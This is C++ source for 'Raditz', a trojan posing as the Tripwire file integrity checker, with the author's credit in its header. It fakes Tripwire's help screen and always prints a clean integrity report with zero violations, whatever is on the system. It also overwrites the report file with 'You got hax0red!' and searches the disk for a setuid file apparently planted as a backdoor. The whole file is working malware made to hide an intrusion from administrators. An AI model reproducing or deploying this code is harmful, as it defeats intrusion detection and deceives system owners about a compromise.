/*Raditz by Technion@wiretapped.net
FAQ sheet on homepage.
homepage: www.coons.org

Change below definition to a suitable date for the "last update" field
*/

#define LASTDATE "Wed Jun  7 20:55:52 2000"
#define HAXOR "You got hax0red!"

#include <string.h>
#include <iostream.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <fstream.h>

#define NO_INPUT "
tripwire: File integrity assessment application.

Tripwire(R) 2.2.1.106 for Linux

Copyright (C) 1998-2000 Tripwire(R) Security Systems, Inc.
Tripwire(R) is a registered trademark of the Purdue Research
Foundation and is licensed exclusively to Tripwire(R) Security
Systems, Inc.
Use -h to get help.
"
#define HELP_SCREEN "
tripwire: File integrity assessment application.

Tripwire(R) 2.2.1.106 for Linux

Copyright (C) 1998-2000 Tripwire(R) Security Systems, Inc.
Tripwire(R) is a registered trademark of the Purdue Research
Foundation and is licensed exclusively to Tripwire(R) Security
Systems, Inc.
Usage:

Database Initialization:  tripwire [-m i|--init] [options]
Integrity Checking:  tripwire [-m c|--check] [object1 [object2...]]
Database Update:  tripwire [-m u|--update]
Policy Update:  tripwire [-m p|--update-policy] policyfile.txt
Test:  tripwire [-m t|--test] --email address
"

#define CONTENTS "
===============================================================================
Rule Summary:
===============================================================================
  
-------------------------------------------------------------------------------
  Section: Unix File System
-------------------------------------------------------------------------------

  Rule Name                       Severity Level    Added    Removed Modified
  ---------                       --------------    -----    ------- --------
  Invariant Directories           66                0        0        0
  Tripwire Data Files             100               0        0        0
  Temporary directories           33                0        0        0
  Critical devices                100               0        0        0
  Tripwire Binaries               100               0        0        0
  User binaries                   66                0        0        0
  setuid/setgid                   100               0        0        0
  Libraries                       66                0        0        0
  OS executables and libraries    100               0        0        0
  Shell Binaries                  0                 0        0        0
  Critical configuration files    100               0        0        0
  Configuration Files             0                 0        0        0
  Security Control                0                 0        0        0
  Boot Scripts                    0                 0        0        0
  (/etc/rc.d/rc.sysinit)
  Login Scripts                   0                 0        0        0
  (/etc/csh.cshrc)
  System boot changes             100               0        0        0

Total objects scanned:  10023
Total violations found:  0
  
===============================================================================
Object Summary:
===============================================================================
  
-------------------------------------------------------------------------------
# Section: Unix File System
-------------------------------------------------------------------------------

No violations.
  
===============================================================================
Error Report:  
===============================================================================

No Errors

-------------------------------------------------------------------------------
*** End of report ***

Copyright (C) 1998-2000 Tripwire(R) Security Systems, Inc.
Tripwire(R) is a registered trademark of the Purdue Research
Foundation and is licensed exclusively to Tripwire(R) Security
Systems, Inc.
Integrity check complete.



"

int main(int argc, char **argv) 
{
   int m_found = 0;
   char c;
   while ((c = getopt (argc, argv, "m")) != -1)
   {
      switch (c)
      {
      case 'm':
         m_found = 1;
         break;
      case '?':
         cout << HELP_SCREEN;
         return 0;
         break;
      default:
          return 1;
      }
   }
   if(!m_found)
   {
      cout << NO_INPUT;
      return 0;
   }
   sleep(3);
   cout << "Parsing policy file: /usr/TSS/policy/tw.pol\n";
   sleep(1);
   cout << "*** Processing Unix File System ***\n";
   cout << "Performing integrity check...\n";
   system("find / -name Technion -perm 4777 >&/dev/null");

   time_t curtime;
   struct tm *loctime;
   curtime = time (NULL);
   loctime = localtime (&curtime);

   char gaytime[128];
   char templat[64] = "%Y%m%d-%H%M%S";
   strftime(gaytime, 128, templat, loctime);
   sleep(1);

   char hostname[128];
   gethostname(hostname, 128);
   char *dir="/usr/TSS/report/";
   char reportfile[256];
   strcpy(reportfile, dir);
   strcat(reportfile, hostname);

   char *dash = "-";
   strcat(reportfile, dash);
   strcat(reportfile, gaytime);

   char *extension = ".twr";
   strcat(reportfile, extension);
   cout << "Wrote report file: ";
   cout << reportfile;
   ofstream OutFile(reportfile);
   OutFile << HAXOR   ;
   OutFile.close();   
   
   cout << endl << endl;
   cout << "Tripwire(R) 2.2.1 Integrity Check Report\n\n";
   cout << "Report generated by:\t\troot\n";
   cout << "Report created on:\t\t";
   cout << asctime (loctime);
   cout << "Database last updated on:\t" << LASTDATE << "\n\n";
   
   for(int i=0;i<80;i++)
      cout << '=';
   cout << "Report Summary:\n";

   for(int j=0;j<80;j++)
      cout << '=';


   cout << "\n\nHost name:\t\t\t" << hostname <<endl;
   cout << "Host IP address:\t\t127.0.0.1";
   cout << "\nHost ID\t:\t\t\t";
   long int yourmum = gethostid();
   cout.setf(ios::hex, ios::basefield);
   cout << yourmum << endl;
   cout.setf(ios::dec, ios::basefield);
   cout << "Policy file used:\t\t/usr/TSS/policy/tw.pol" <<endl;
   cout << "Configuration file used:\t/usr/TSS/bin/tw.cfg" <<endl;
   cout << "Database file used:\t\t/usr/TSS/db/" << hostname<< ".twd\n";
   cout << "Command line used:\t\t" << argv[0] << " -m c\n";
   cout << CONTENTS;



   return 0;
}
